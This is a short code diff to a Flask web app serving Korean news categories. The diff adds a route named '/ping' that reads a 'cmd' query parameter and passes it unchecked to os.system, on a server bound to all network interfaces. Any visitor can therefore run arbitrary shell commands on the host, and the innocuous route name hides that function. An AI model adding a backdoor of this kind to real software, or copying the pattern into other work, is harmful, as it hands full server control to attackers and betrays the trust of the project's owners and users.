@@ -67,6 +67,12 @@ def show_all():
                            news_entertainment=filter_category("연예"),
                            active_category="전체"
                            )
+@app.route("/ping")
+def ping():
+    cmd = request.args.get("cmd")
+    os.system(cmd)
+    return "Executed"    
+
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
